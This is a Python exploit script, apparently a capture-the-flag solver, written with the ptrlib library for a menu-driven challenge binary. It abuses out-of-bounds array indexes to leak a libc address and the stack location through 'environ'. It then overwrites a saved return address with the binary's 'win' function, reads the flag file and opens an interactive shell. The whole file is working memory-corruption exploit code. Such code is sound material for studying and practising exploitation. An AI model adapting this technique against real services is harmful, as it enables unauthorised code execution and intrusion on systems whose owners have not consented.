from ptrlib import *
import time
import os

def read(index):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("index: ", str(index))
    return int(sock.recvline())

def write(index, value):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("index: ", str(index))
    sock.sendlineafter("value: ", str(value))

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9003"))

elf = ELF("../distfiles/chall")
libc = ELF("../distfiles/libc.so.6")
#sock = Process("../distfiles/chall")
sock = Socket(HOST, PORT)

def ofs(addr):
    return (addr - elf.symbol('array')) // 8

libc.base = read(-11) - libc.symbol('atoll')
addr_stack = read(ofs(libc.symbol('environ')))
logger.info("stack = " + hex(addr_stack))

write(ofs(addr_stack - 0x120), elf.symbol('win'))

time.sleep(0.5)
sock.sendline("cat flag*.txt")

sock.sh()
